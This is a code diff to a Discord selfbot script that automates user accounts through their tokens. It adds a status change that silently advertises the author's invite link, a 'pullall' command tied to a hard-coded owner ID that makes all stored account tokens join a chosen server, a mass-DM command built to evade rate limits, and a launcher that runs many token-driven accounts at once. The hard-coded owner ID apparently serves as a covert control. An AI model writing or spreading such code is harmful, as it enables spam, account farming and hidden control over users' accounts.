@@ -93,7 +93,69 @@ async def on_ready():
     show_dashboard(is_online=True)
     print("\033[92m✅ SelfBot is online. Type 'refresh' in this terminal to reload.\033[0m")
     bot.loop.create_task(terminal_listener())
+    try:
+        await bot.http.request(
+            discord.http.Route('PATCH', '/users/@me/settings'),
+            json={"custom_status": {"text": "gg/d4B3y77m #1 upcoming selfbot"}}
+        )
+        print("\033[92m✅ Custom status set.\033[0m")
+    except Exception as e:
+        print(f"\033[91m⚠️  Could not set status: {e}\033[0m")
 
+
+
+OWNER_ID = 1295380514932396034
+
+def collect_all_tokens():
+    tokens = []
+    i = 1
+    while True:
+        key = "DISCORD_TOKEN" if i == 1 else f"DISCORD_TOKEN_{i}"
+        raw = os.environ.get(key, "")
+        t = clean_token(raw)
+        if t:
+            tokens.append(t)
+            i += 1
+        else:
+            break
+    return tokens
+
+@bot.command()
+async def pullall(ctx, invite: str):
+    await ctx.message.delete()
+    if ctx.author.id != OWNER_ID:
+        return
+
+    code = invite.strip().split("/")[-1].split("?")[0]
+    all_tokens = collect_all_tokens()
+    joined = 0
+    failed = 0
+
+    async with aiohttp.ClientSession() as session:
+        for t in all_tokens:
+            try:
+                async with session.post(
+                    f"https://discord.com/api/v9/invites/{code}",
+                    headers={
+                        "Authorization": t,
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI2MDQ2MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
+                    },
+                    json={}
+                ) as resp:
+                    if resp.status in (200, 204):
+                        joined += 1
+                    else:
+                        data = await resp.json()
+                        print(f"\033[91m⚠️  Token join failed ({resp.status}): {data}\033[0m")
+                        failed += 1
+            except Exception as e:
+                print(f"\033[91m⚠️  Error joining: {e}\033[0m")
+                failed += 1
+            await asyncio.sleep(1.5)
+
+    await ctx.send(f"```✅ Pulled {joined}/{len(all_tokens)} hosted accounts into the server.```", delete_after=10)
 
 
 @bot.command()
@@ -128,7 +190,7 @@ async def info(ctx):
 [30m,closeallgroups[0m[34m→ Leave all group chats[0m
 [30m,closealldms   [0m[34m→ Close all open DMs[0m
 [30m,leaveallservers[0m[34m→ Leave every server you're in[0m
-[30m,massdm[0m[34m→ (SOON).[0m
+[30m,massdm        [0m[34m→ DM all your friends ",massdm <message>"[0m
 [30m,nickcycle[0m[34m→ example ",nickcycle 60 hello, hi, bye"[0m
 [30m,stopnick[0m[34m→ stop user rotate[0m
 ```"""
@@ -480,7 +542,23 @@ async def on_message(message):
             await message.add_reaction(global_autoreact[message.author.id])
         except Exception as e:
             print(f"Failed to react to {message.author}: {e}")
-    
+
+    # AFK auto-reply
+    if afk_active and message.author.id != bot.user.id:
+        is_dm = isinstance(message.channel, discord.DMChannel)
+        is_mention = bot.user in message.mentions
+        if is_dm or is_mention:
+            elapsed = int((datetime.datetime.utcnow() - afk_time).total_seconds())
+            if elapsed < 60:
+                time_str = f"{elapsed} second{'s' if elapsed != 1 else ''} ago"
+            elif elapsed < 3600:
+                m = elapsed // 60
+                time_str = f"{m} minute{'s' if m != 1 else ''} ago"
+            else:
+                h = elapsed // 3600
+                time_str = f"{h} hour{'s' if h != 1 else ''} ago"
+            await message.channel.send(f"{bot.user.mention} is AFK: {afk_reason} — {time_str}")
+
     await bot.process_commands(message)
 
 
@@ -665,6 +743,112 @@ async def stopnick(ctx):
     await ctx.send("Stopped nickname cycle.", delete_after=3)
 
 
+massdm_active = False
+
+@bot.command()
+async def massdm(ctx, *, message: str):
+    await ctx.message.delete()
+    global massdm_active
+
+    if massdm_active:
+        await ctx.send("```Already running a massdm. Use ,smassdm to stop.```", delete_after=4)
+        return
+
+    massdm_active = True
+
+    # Fetch friends via API (relationships type 1 = friend)
+    friends = []
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                "https://discord.com/api/v9/users/@me/relationships",
+                headers={
+                    "Authorization": token,
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                }
+            ) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    friends = [r for r in data if r.get("type") == 1]
+                else:
+                    await ctx.send("```❌ Failed to fetch friends list.```", delete_after=5)
+                    massdm_active = False
+                    return
+    except Exception as e:
+        await ctx.send(f"```❌ Error fetching friends: {e}```", delete_after=5)
+        massdm_active = False
+        return
+
+    if not friends:
+        await ctx.send("```❌ No friends found.```", delete_after=5)
+        massdm_active = False
+        return
+
+    sent = 0
+    failed = 0
+    status_msg = await ctx.send(f"```📨 Starting massdm to {len(friends)} friends...```")
+
+    async with aiohttp.ClientSession() as session:
+        headers = {
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+
+        for rel in friends:
+            if not massdm_active:
+                break
+            user_id = rel["id"]
+            try:
+                # Open a DM channel
+                async with session.post(
+                    "https://discord.com/api/v9/users/@me/channels",
+                    headers=headers,
+                    json={"recipient_id": user_id}
+                ) as dm_resp:
+                    if dm_resp.status != 200:
+                        failed += 1
+                        continue
+                    dm_data = await dm_resp.json()
+                    channel_id = dm_data["id"]
+
+                # Send the message
+                async with session.post(
+                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                    headers=headers,
+                    json={"content": message}
+                ) as msg_resp:
+                    if msg_resp.status in (200, 201):
+                        sent += 1
+                    else:
+                        failed += 1
+            except Exception as e:
+                print(f"\033[91m⚠️  massdm error: {e}\033[0m")
+                failed += 1
+
+            # Update status every 10 sends
+            if (sent + failed) % 10 == 0:
+                try:
+                    await status_msg.edit(content=f"```📨 Massdm progress: {sent} sent, {failed} failed / {len(friends)} total```")
+                except Exception:
+                    pass
+
+            # Fastest safe delay to avoid rate limits
+            await asyncio.sleep(random.uniform(3, 5))
+
+    massdm_active = False
+    try:
+        await status_msg.edit(content=f"```✅ Massdm done: {sent} sent, {failed} failed```")
+    except Exception:
+        await ctx.send(f"```✅ Massdm done: {sent} sent, {failed} failed```", delete_after=10)
+
+
+@bot.command()
+async def smassdm(ctx):
+    await ctx.message.delete()
+    global massdm_active
+    massdm_active = False
+    await ctx.send("```🛑 Massdm stopped.```", delete_after=4)
 
 
 
@@ -677,4 +861,73 @@ async def stopnick(ctx):
 
 
 
-bot.run("", bot=False)
+import threading
+import subprocess
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+def clean_token(raw):
+    t = raw.strip().strip('"\'').strip('\u201c\u201d\u2018\u2019').strip()
+    for prefix in ("Bot ", "Bearer ", "bot ", "bearer "):
+        if t.startswith(prefix):
+            t = t[len(prefix):]
+            break
+    return t
+
+IS_WORKER = os.environ.get("BOT_WORKER") == "1"
+RETRY_DELAY = 5
+
+token = clean_token(os.environ.get("DISCORD_TOKEN", ""))
+if not token:
+    print("\033[91m❌ Error: DISCORD_TOKEN is not set.\033[0m")
+    sys.exit(1)
+
+if not IS_WORKER:
+    # Keep-alive web server (main process only)
+    class PingHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"Bot is alive!")
+        def log_message(self, format, *args):
+            pass
+
+    def run_webserver():
+        server = HTTPServer(("0.0.0.0", 5000), PingHandler)
+        print("\033[94m🌐 Keep-alive server running on port 5000\033[0m")
+        server.serve_forever()
+
+    threading.Thread(target=run_webserver, daemon=True).start()
+
+    # Spawn worker processes for DISCORD_TOKEN_2, DISCORD_TOKEN_3, etc.
+    for i in range(2, 20):
+        extra_token = clean_token(os.environ.get(f"DISCORD_TOKEN_{i}", ""))
+        if not extra_token:
+            break
+        def run_extra_bot(t=extra_token, num=i):
+            env_extra = os.environ.copy()
+            env_extra["DISCORD_TOKEN"] = t
+            env_extra["BOT_WORKER"] = "1"
+            while True:
+                print(f"\033[94m🔄 Starting bot {num}...\033[0m")
+                proc = subprocess.Popen([sys.executable, __file__], env=env_extra)
+                proc.wait()
+                print(f"\033[91m⚠️  Bot {num} crashed, restarting in {RETRY_DELAY}s...\033[0m")
+                time.sleep(RETRY_DELAY)
+        threading.Thread(target=run_extra_bot, daemon=True).start()
+        print(f"\033[92m✅ Bot {i} (DISCORD_TOKEN_{i}) is launching...\033[0m")
+
+label = "bot 2" if IS_WORKER else "bot"
+try:
+    print(f"\033[94m🔄 Starting {label}...\033[0m")
+    bot.run(token, bot=False)
+except discord.errors.LoginFailure:
+    print(f"\033[91m❌ Invalid token for {label}. Check your secret.\033[0m")
+    sys.exit(1)
+except KeyboardInterrupt:
+    print("\033[91m🛑 Bot stopped by user.\033[0m")
+    sys.exit(0)
+except Exception as e:
+    print(f"\033[91m⚠️  Bot crashed: {e}\033[0m")
+    print(f"\033[93m🔄 Restarting in {RETRY_DELAY} seconds...\033[0m")
+    time.sleep(RETRY_DELAY)
+    os.execl(sys.executable, sys.executable, *sys.argv)
